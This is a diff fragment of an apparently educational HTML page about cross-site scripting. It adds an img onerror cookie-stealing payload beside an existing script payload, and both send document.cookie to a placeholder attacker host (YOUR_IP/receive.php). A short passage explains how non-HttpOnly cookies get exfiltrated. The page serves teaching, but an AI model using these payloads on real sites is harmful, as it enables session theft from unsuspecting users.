@@ -402,6 +402,8 @@ if(isset($_GET[&#39;cookie&#39;])){
 <pre tabindex="0"><code>&lt;script&gt;
 fetch(&#39;http://YOUR_IP/receive.php?cookie=&#39; + document.cookie);
 &lt;/script&gt;
+</code></pre><p>or</p>
+<pre tabindex="0"><code>&lt;img src=1 onerror=&#34;document.location=&#39;http://YOUR_IP/receive.php&#39;+ document.cookie&#34;&gt;
 </code></pre><p><strong>XSS scripts</strong> run in the victim’s browser and can read cookies not marked <strong>HttpOnly</strong>.
 These cookies are then <strong>sent to a server you control</strong> via JavaScript.
 The victim’s browser acts as the messenger, automatically delivering the cookies when the payload is triggered.</p>
